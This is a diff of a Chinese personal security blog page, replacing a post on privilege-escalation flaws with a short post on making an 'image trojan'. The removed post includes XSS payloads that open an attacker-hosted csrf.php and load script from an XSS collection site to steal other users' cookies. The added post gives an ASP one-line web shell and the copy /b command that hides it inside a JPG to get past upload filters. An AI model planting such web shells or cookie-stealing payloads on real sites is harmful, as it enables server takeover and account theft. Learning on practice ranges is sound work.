@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="越权漏洞笔记整理, Cat00011cat,偏锋小白菜,网络日记,个人博客,BLOG">
-    <meta name="description" content="越权漏洞知识点总结">
+    <meta name="keywords" content="图片马制作, Cat00011cat,偏锋小白菜,网络日记,个人博客,BLOG">
+    <meta name="description" content="快速制作图片马！">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>越权漏洞笔记整理 | Cat00011cat</title>
+    <title>图片马制作 | Cat00011cat</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -338,12 +338,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218021317.jfif')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">越权漏洞笔记整理</h1>
+                    <h1 class="description center-align post-title">图片马制作</h1>
                 </div>
             </div>
         </div>
@@ -390,28 +390,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-02-04
+                    2020-02-18
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-02-05
+                    2020-02-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    687
+                    139
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    1 分
                 </div>
                 
 				
@@ -427,90 +427,12 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="越权漏洞分为三大类"><a href="#越权漏洞分为三大类" class="headerlink" title="越权漏洞分为三大类"></a>越权漏洞分为三大类</h1><blockquote>
-<h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><h2 id="交叉越权"><a href="#交叉越权" class="headerlink" title="交叉越权"></a>交叉越权</h2></blockquote>
-<blockquote>
-<h4 id="水平越权-1"><a href="#水平越权-1" class="headerlink" title="水平越权"></a>水平越权</h4></blockquote>
-<p><strong>A用户和B用户属于同一级别用户，但各自不能操作对方个人信息，A用户如果越权操作B用户的个人信息的情况称为平行越权操作。</strong></p>
-<p>总结：权限类型不变，权限ID改变</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204021026.png" alt=""></p>
-<ul>
-<li><h5 id="靶场复现"><a href="#靶场复现" class="headerlink" title="靶场复现"></a>靶场复现</h5></li>
-</ul>
-<p>目标靶场：<a href="https://bug.chinacycc.com/" target="_blank" rel="noopener">https://bug.chinacycc.com/</a></p>
-<p>1、浏览器安装代理插件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204154257.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204154258.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204154259.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204154300.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204154302.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204154301.png" alt=""></p>
-<p>2、对目标站点进行抓包</p>
-<p><del>启动Burp神器，提示连接不安全，，浏览器访问<a href="https://burp/" target="_blank" rel="noopener">https://burp/</a> 下载证书并导入至浏览器</del></p>
-<p>开启intercept is on （表示捕获状态）</p>
-<p>Forward （放过这个包）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204154303.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204154304.png" alt=""></p>
-<p>成功捕获数据包</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204154305.png" alt=""></p>
-<ul>
-<li><p>通过修改userid:来实现平行越权</p>
-<ul>
-<li><p>session存储于服务器</p>
-</li>
-<li><p>cookie存储于客户端（浏览器）</p>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204154307.png" alt=""></p>
-<p>放行数据包之后，成功查看到用户地址信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204154306.png" alt=""></p>
-<p>可对地址信息执行 修改/删除 等操作</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204154308.png" alt=""></p>
-<p>Burp抓取到的 收货地址信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204154309.png" alt=""></p>
-<ul>
-<li>继续深入测试，发现存在XSS跨站脚本漏洞</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204180638.png" alt=""></p>
-<blockquote>
-<p><strong>Cookie越权</strong>指的是账户之间的越权    都属于平行越权</p>
-<p>挖掘技巧</p>
-<ul>
-<li><p>如何查找越权漏洞：多看cookie、userid、type 等关键字</p>
-</li>
-<li><p>cookie没加密可以仔细看看，加密一晃而过；cookie值如果是明文的话存在越权可能很大，多试试</p>
-</li>
-</ul>
-</blockquote>
-<h5 id="尝试CSRF打出其他用户的COOKIE"><a href="#尝试CSRF打出其他用户的COOKIE" class="headerlink" title="尝试CSRF打出其他用户的COOKIE"></a>尝试CSRF打出其他用户的COOKIE</h5><p>首先Burp抓取数据包，之后右键构建CSRF表单；</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204180639.png" alt=""></p>
-<p>创建csrf.php 文件 将构建出来的表单代码复制到 csrf.php文件里面。</p>
-<p>将这个csrf.php传到服务器，并通过域名访问到它。</p>
-<p><a href="http://dedecms.thecat.top/csrf.php" target="_blank" rel="noopener">http://dedecms.thecat.top/csrf.php</a></p>
-<p>我们回到靶场收货地址，插入代码</p>
-<pre><code>&gt;"'&gt;&lt;script src="x" onerror=javascript:window.open("http://dedecms.thecat.top/csrf.PHP")&gt;&lt;/script&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204180645.png" alt=""></p>
-<p>保存地址，会跳转到我创建的csrf表单</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204180640.png" alt=""></p>
-<p>再次回到收货地址  ——修改另一个收货地址，继续插入XSS代码</p>
-<pre><code>&lt;sCRiPt sRC=//xssye.com/111111111&gt;&lt;/sCrIpT&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204180642.png" alt=""></p>
-<p>最后再次点击我构建的csrf表单</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204180644.png" alt=""></p>
-<p>一切准备就绪，回到XSS测试平台；</p>
-<p>我们就会发现，不仅获取到COOKIE还获取了用户其它信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204180641.png" alt=""></p>
-<blockquote>
-<h4 id="垂直越权-1"><a href="#垂直越权-1" class="headerlink" title="垂直越权"></a>垂直越权</h4></blockquote>
-<p><strong>A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。</strong></p>
-<p>总结：权限ID不变，权限类型改变</p>
-<ul>
-<li>垂直越权必要条件：Admin用户与User用户处于同一个数据表中</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200204020500.png" alt=""></p>
-<blockquote>
-<h4 id="交叉越权-1"><a href="#交叉越权-1" class="headerlink" title="交叉越权"></a>交叉越权</h4></blockquote>
-<p><strong>即改变ID，也改变权限</strong></p>
+                <p>我把图片命名为zhf111.jpg</p>
+<p>接下来写一句话木马<br>新建一个zhf111.asp文件，写入一句话木马<br>&lt;%Y=request(“Cat00011cat”)%&gt; &lt;%execute(Y)%&gt;</p>
+<p>然后在win+R，cmd，cd到原始图片的目录路径下</p>
+<p>copy zhf111.jpg/b+zhf111.asp/a zhfmua.jpg</p>
+<p>桌面上出现新的图片就是制作出的图片马</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218021115.png" alt=""></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -554,7 +476,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://www.thecat.top/posts/61871.html">http://www.thecat.top/posts/61871.html</a>
+                    <a href="http://www.thecat.top/posts/5813.html">http://www.thecat.top/posts/5813.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -764,7 +686,7 @@
         repo: 'Leaving-a-message',
         owner: 'lateral404',
         admin: "lateral404",
-        id: '2020-02-04T18-31-33',
+        id: '2020-02-18T02-17-33',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1048,28 +970,29 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/21678.html">
+                <a href="/posts/5813.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209015106.jfif" class="responsive-img" alt="CSRF跨站请求伪造笔记整理">
+                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218021317.jfif" class="responsive-img" alt="图片马制作">
                         
-                        <span class="card-title">CSRF跨站请求伪造笔记整理</span>
+                        <span class="card-title">图片马制作</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            CSRF跨站请求伪造，是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。
+                            快速制作图片马！
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-02-05
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-18
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1082,6 +1005,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1100,30 +1024,30 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/33323.html">
+                <a href="/posts/45471.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200202214138.jfif" class="responsive-img" alt="安装DEDECMS出现404">
+                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218015136.jfif" class="responsive-img" alt="逻辑漏洞">
                         
-                        <span class="card-title">安装DEDECMS出现404</span>
+                        <span class="card-title">逻辑漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            DEDECMS访问出现404解决方案
+                            绕过验证码直接修改绑定手机号码，根据程序员的逻辑思维产生的漏洞！
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-18
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/BT/" class="post-category">
-                                    BT
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                    网络安全
                                 </a>
                             
                             
@@ -1133,8 +1057,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/">
-                        <span class="chip bg-color">网站建设</span>
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
                     </a>
                     
                 </div>
